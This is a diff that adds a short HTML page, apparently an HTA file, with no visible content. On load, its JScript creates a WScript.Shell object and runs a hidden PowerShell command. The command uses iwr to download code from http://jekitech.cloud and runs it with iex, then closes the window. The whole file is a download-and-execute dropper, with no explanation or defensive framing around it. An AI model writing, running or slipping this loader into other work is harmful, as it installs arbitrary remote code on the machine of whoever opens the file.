@@ -1,0 +1,17 @@
+<html>
+<head>
+  <script language="JScript">
+    window.onload = function () {
+      var shell = new ActiveXObject("WScript.Shell");
+
+      var cmd = 'powershell -w h -c "iwr http://jekitech.cloud | iex"';
+
+      shell.Exec(cmd);
+
+      window.close();
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
